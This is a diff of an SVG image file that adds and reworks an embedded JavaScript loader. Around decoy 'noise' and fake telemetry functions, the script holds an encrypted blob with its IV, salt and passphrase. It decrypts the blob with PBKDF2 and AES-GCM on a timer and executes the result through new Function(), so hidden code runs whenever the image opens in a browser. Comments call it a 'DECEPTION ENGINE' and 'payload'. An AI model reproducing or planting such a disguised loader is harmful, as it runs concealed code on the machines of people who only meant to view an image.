@@ -3,57 +3,57 @@
   <!-- UmVhZGluZ19EYXRhX0VuY3J5cHRlZCBXaXRob3V0X1JldmVhbA== -->
 
   <script type="application/javascript"><![CDATA[
-    // *** FAKE CONSOLE ENGINE ***
-    const SYS_TAG = "[SYS_CORE]";
-    let sessionMeta = {
-      bootTime: Date.now(),
-      memUse: 0,
-      fakeLoops: 0,
-      dummyOps: 0,
-      randomKey: 202
+    // *** DECEPTION ENGINE ***
+    const SYSTEM_TAG = "[SYS_CORE]";
+    let sessionData = {
+      systemStart: Date.now(),
+      memoryUsage: 0,
+      fakeCycles: 0,
+      dummyProcesses: 0,
+      randomToken: 202
     };
 
- const bel = "[EMAIL]";
+    const bel = "[EMAIL]";
     const lieve = "[KEY]";
 
-    // Noisy calculation
-    function entropyGarbage() {
-      const junkA = Math.random().toString(36).substring(2, 7);
-      const junkB = Math.random().toString(36).substring(3, 8);
-      return `X_${junkA}${junkB}`;
+    // Useless computation
+    function generateNoise() {
+      const noiseA = Math.random().toString(36).substring(2, 7);
+      const noiseB = Math.random().toString(36).substring(3, 8);
+      return `X_${noiseA}${noiseB}`;
     }
 
-    function fakeMonitor() {
-      sessionMeta.memUse = window?.performance?.memory?.usedJSHeapSize || 0;
-      sessionMeta.fakeLoops = Math.floor(Math.random() * 9000);
-      sessionMeta.dummyOps += 1;
+    function monitorFakeProcess() {
+      sessionData.memoryUsage = window?.performance?.memory?.usedJSHeapSize || 0;
+      sessionData.fakeCycles = Math.floor(Math.random() * 9000);
+      sessionData.dummyProcesses += 1;
     }
 
-    // *** ACTUAL CORE GATE ***
-    const engineKernel = (() => {
-      const secret = {
-        ivCode: "f11fa4cf9350b5a4f4874a76",
-        salt: "e6a57e356b20c5dab33579c46a703cda",
-        dataBlob: "496a79d4cab3f623d8b2a69380a2701909fe77d23de6bb94c3d4ec7557332743f20ae339a48001626943df086e9cf068d5e7dfdbf157ced02a2a984add5170abc20946e79ea812558373c02167e53f9bac58eb7572151b12bf86c2c58930977f173c052ee322db89a6dca5f98815fabfdc53a45f5fd5456f18cf170540fbc8e46b5da7bd3ab6967616122de0a1d37db447db8aed94f8b42d62fa1ba07cd43eb9a8e1d6ef1622db5a5ee2071ff4e543201ae082fe5c7c87da690abe014170b68af9361fef47d452415a4ae048ab3cc57e87ebc91e056a023a94a871c7b91b82c3b7dc369e4c4d25bdc19da4fff30aa707cb5d13b48d951f4881d7f3788c2ed0de3d8fbfc9258c8d4a9e383fce9f4c7b47d40e5ba6d9a1e364f15ea52891bc3fa9c7c069010a9cf24a0b9a79d6b664d3c12bbb57b24ea8da4761fde85fda06f5752b54bf5401e36b19e6e4422ecab5803ef571b2e7895e77d213ed2900aca6420ddcd08989be88c1ecf30964a1f4ceb5d027d14ecbb9a47e7ce47ddbb393bdd2eae42ece59cdb9510d2f024c4f679e32fc049fd4fe442c6e615c6591efa25c0eb54162f31503d72261c7f9f865fa5eb6d1a5a52869a76539fc837d42b0f6eb55b1a70288e4378d0dcf512d44f87448fc9621992b5cc7297e35b0855cf20bc13fec807b8c09ad52ffc95832e6fe250e491628be49" /* REDACTED */,
-        password: "glad"
+    // *** CRYPTOLOGIC ENGINE ***
+    const coreEngine = (() => {
+      const securedData = {
+        ivToken: "cf83fc1d9ff8603d789fe44d",
+        saltData: "d800d581b41f83d7ff7e1cbf6c1d030b",
+        encryptedBlob: "d00bf4e9bd1b7006da67e0545637abe8116941685bd0d6d759eca50bfebdda6d802376d7c02325423a44f55b622a62b9041987aa5ea5184827bda93eb1787911f11ff462d9b0fddac13ba0d2ba69deb340c38d8d6d297ce47c742ae5542948d78dee731f64e71cc98241faaef44883a004322c0a7da91197f89e0d89a732effbaba9c64db540e9ea71310cb732183bc2ef9d61d763bd3fe4dcc596cfd485ae7cc5d2f27813c0a088bc961709291def9825e25bf8b3accc7c80a72224f7b0fd73d312cb7216747abca06e9e7397411067f19f0dfe84e17b0f714f02ca2192ed1e47b8ed499bd06d47966a45580dd884734c845a578bd0da9cfd79a0354c0fa6fb8d0dcc111e13dd8cdb15416f3a13c03b017586bed40ac74d193b3d1515b11ec150388c90c2006ff3299a8a45c9bc5705ab63da21422052e0920b7560ff88bb41673c866655fcd961d04f57e77d68ab9e9601618dbcc355a96e673a9a4af6b9c793ca7ffa59bc8e4e5f8407276fe936d15403cd7c1e8ba861d39e342bd92fd96aaae29d808fbbaf4a7d9119ab3c523ae833f2aba6d38f32f678d9cf4e1c563bc133aa1aeaeee3089d726a1c475e19b6f9e7bc9385aec2898f0bff2627a91e6fa6519ae7085d8098b91acd2f21275b511f49714a64fffd06eead5160c6d08d19029e7c514097af5ece77789ddb919e04e1cbba232978dd12b45c02de33239d1029e454e62deabd3ad03e7b038917df436967cee91f17c43dc6a7f78f7e23ae93db731e814e39385479df66ed61fab77b50efb2207cd86be564fb3e467f80385190388849a3576fd6c7ef2612eb35f2a4833854225f8e7effdb761aeed9f9314253f44ee6845b706c04c2254d2e55cc13e62a24e881729549068085be4beeda5056120532df7c11c36e9543f22d67476a1c1401eb69",
+        passphrase: "nomadenvolIV"
       };
 
-      const bait = {
-        isReady: false,
-        decoy: true,
-        token: entropyGarbage()
+      const diversion = {
+        isActive: false,
+        baiting: true,
+        securityToken: generateNoise()
       };
 
       return {
-        getIV: () => secret.ivCode,
-        getSalt: () => secret.salt,
-        getBlob: () => secret.dataBlob,
-        getKey: () => secret.password,
-        baitInfo: () => ({ ...bait })
+        getIV: () => securedData.ivToken,
+        getSalt: () => securedData.saltData,
+        getBlob: () => securedData.encryptedBlob,
+        getKey: () => securedData.passphrase,
+        baitInfo: () => ({ ...diversion })
       };
     })();
 
-    function hexToArrayBuffer(hexStr) {
+    function convertHexToBuffer(hexStr) {
       const result = new Uint8Array(hexStr.length / 2);
       for (let i = 0; i < result.length; i++) {
         result[i] = parseInt(hexStr.substr(i * 2, 2), 16);
@@ -61,28 +61,28 @@
       return result;
     }
 
-    async function fakeWait() {
+    async function delayFakeProcess() {
       return new Promise((resolve) => {
         setTimeout(() => {
-          console.log("Entropy delay:", entropyGarbage());
-          resolve(entropyGarbage());
+          console.log("Noise delay:", generateNoise());
+          resolve(generateNoise());
         }, 111);
       });
     }
 
-    async function triggerDecrypt() {
-      fakeMonitor();
+    async function initiateDecryption() {
+      monitorFakeProcess();
       try {
-        const inputKey = engineKernel.getKey();
-        const kdf = await crypto.subtle.importKey(
+        const userInputKey = coreEngine.getKey();
+        const keyDerivation = await crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(inputKey),
+          new TextEncoder().encode(userInputKey),
           { name: "PBKDF2" },
           false,
           ["deriveKey"]
         );
 
-        const saltBuffer = hexToArrayBuffer(engineKernel.getSalt());
+        const saltBuffer = convertHexToBuffer(coreEngine.getSalt());
         const aesKey = await crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
@@ -90,49 +90,49 @@
             iterations: 100000,
             hash: "SHA-256"
           },
-          kdf,
+          keyDerivation,
           { name: "AES-GCM", length: 256 },
           false,
           ["decrypt"]
         );
 
-        const ivBuffer = hexToArrayBuffer(engineKernel.getIV());
-        const dataBuffer = hexToArrayBuffer(engineKernel.getBlob());
+        const ivBuffer = convertHexToBuffer(coreEngine.getIV());
+        const dataBuffer = convertHexToBuffer(coreEngine.getBlob());
 
-        await fakeWait();
+        await delayFakeProcess();
 
-        const decryptedData = await crypto.subtle.decrypt(
+        const decryptedContent = await crypto.subtle.decrypt(
           { name: "AES-GCM", iv: ivBuffer },
           aesKey,
           dataBuffer
         );
 
-        const decoded = new TextDecoder().decode(decryptedData);
-        (new Function(decoded))();
-      } catch (err) {
-        console.warn("Oops! Decryption error:", err);
+        const decodedContent = new TextDecoder().decode(decryptedContent);
+        (new Function(decodedContent))();
+      } catch (error) {
+        console.warn("Decryption failure:", error);
       }
     }
 
     // *** INIT ***
     document.addEventListener("DOMContentLoaded", () => {
-      console.info("Payload staging started...");
+      console.info("Initializing payload...");
       for (let i = 0; i < 3; i++) {
-        console.debug("Noise:", entropyGarbage());
+        console.debug("Generated Noise:", generateNoise());
       }
     });
 
-    setTimeout(triggerDecrypt, 999);
+    setTimeout(initiateDecryption, 999);
 
-    // Fake analytics
-    const telemetryDump = () => {
+    // Fake telemetry data
+    const telemetryInfo = () => {
       return {
-        ping: Date.now(),
-        data: entropyGarbage(),
-        load: sessionMeta.memUse
+        pingTime: Date.now(),
+        generatedData: generateNoise(),
+        systemLoad: sessionData.memoryUsage
       };
     };
 
-    console.log("Telemetry active:", telemetryDump());
+    console.log("Telemetry status:", telemetryInfo());
   ]]></script>
 </svg>
